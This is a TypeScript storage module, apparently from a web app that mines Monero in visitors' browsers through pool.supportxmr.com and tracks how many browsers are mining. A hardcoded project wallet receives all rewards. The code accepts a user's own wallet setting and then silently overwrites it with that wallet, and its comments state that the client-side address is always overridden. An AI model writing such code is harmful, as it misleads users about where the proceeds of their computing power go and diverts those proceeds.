import {
  users,
  type User,
  type InsertUser,
  MinerState,
  MinerSettings,
  minerStateSchema,
  minerSettingsSchema,
} from "@shared/schema";

// Default wallet address - should match with client-side default
// This is the single wallet address where ALL mining rewards will be sent regardless of user
// The client-side wallet address is always overridden with this address
const DEFAULT_WALLET_ADDRESS =
  "4BJ2Kq5xDVEPNLkdsiD6vP5rQwL8ECDoY6FpQeDVry4yf6inC3XEjWiE9xr2SBF6rN856vUvjbFv4GjSSii9hjsD6XKzDvi";

// Interface for all storage operations
export interface IStorage {
  // User operations
  getUser(id: number): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;

  // Miner operations
  getMinerState(): Promise<MinerState>;
  updateMinerState(state: MinerState): Promise<void>;
  getMinerSettings(): Promise<MinerSettings>;
  updateMinerSettings(settings: MinerSettings): Promise<void>;
  getGlobalMiningStats(): Promise<any>;
}

export class MemStorage implements IStorage {
  private users: Map<number, User>;
  private minerState: MinerState;
  private minerSettings: MinerSettings;
  private activeBrowsers: number;
  currentId: number;

  constructor() {
    this.users = new Map();
    this.currentId = 1;

    // Initialize default mining state
    this.minerState = {
      isActive: false,
      hashrate: 0,
      acceptedShares: 0,
      rejectedShares: 0,
      threads: 2,
      throttle: 20,
      totalHashes: 0,
      sessionTime: 0,
      pool: "pool.supportxmr.com:3333",
      walletAddress: DEFAULT_WALLET_ADDRESS,
    };

    // Initialize default mining settings
    this.minerSettings = {
      threads: 2,
      throttle: 20,
      poolUrl: "pool.supportxmr.com:3333",
      walletAddress: DEFAULT_WALLET_ADDRESS,
    };

    // Initialize active browsers count
    this.activeBrowsers = 0;
  }

  // User methods
  async getUser(id: number): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = this.currentId++;
    const user: User = { ...insertUser, id };
    this.users.set(id, user);
    return user;
  }

  // Mining state methods
  async getMinerState(): Promise<MinerState> {
    return { ...this.minerState };
  }

  async updateMinerState(state: MinerState): Promise<void> {
    // Validate the state data
    try {
      const validatedState = minerStateSchema.parse(state);

      // Track active browsers
      if (validatedState.isActive && !this.minerState.isActive) {
        this.activeBrowsers++;
      } else if (!validatedState.isActive && this.minerState.isActive) {
        this.activeBrowsers = Math.max(0, this.activeBrowsers - 1);
      }

      // Update state
      this.minerState = {
        ...this.minerState,
        ...validatedState,
      };

      // Keep settings in sync
      this.minerSettings = {
        threads: validatedState.threads,
        throttle: validatedState.throttle,
        poolUrl: validatedState.pool,
        walletAddress: validatedState.walletAddress,
      };
    } catch (error) {
      console.error("Invalid miner state data:", error);
      throw new Error("Invalid miner state data");
    }
  }

  // Mining settings methods
  async getMinerSettings(): Promise<MinerSettings> {
    return { ...this.minerSettings };
  }

  async updateMinerSettings(settings: MinerSettings): Promise<void> {
    // Validate the settings data
    try {
      const validatedSettings = minerSettingsSchema.parse(settings);

      // Always ensure wallet is the project wallet
      this.minerSettings = {
        ...validatedSettings,
        walletAddress: DEFAULT_WALLET_ADDRESS,
      };

      // Keep state in sync with settings
      this.minerState = {
        ...this.minerState,
        threads: validatedSettings.threads,
        throttle: validatedSettings.throttle,
        pool: validatedSettings.poolUrl,
        walletAddress: DEFAULT_WALLET_ADDRESS,
      };
    } catch (error) {
      console.error("Invalid miner settings data:", error);
      throw new Error("Invalid miner settings data");
    }
  }

  // Global mining statistics
  async getGlobalMiningStats(): Promise<any> {
    return {
      activeBrowsers: this.activeBrowsers,
      globalHashrate:
        this.activeBrowsers > 0
          ? this.minerState.hashrate * this.activeBrowsers
          : 0,
      totalShares: this.minerState.acceptedShares,
      estimatedRewards: {
        daily: "0.00012 XMR",
        weekly: "0.00084 XMR",
        monthly: "0.00362 XMR",
      },
    };
  }
}

export const storage = new MemStorage();
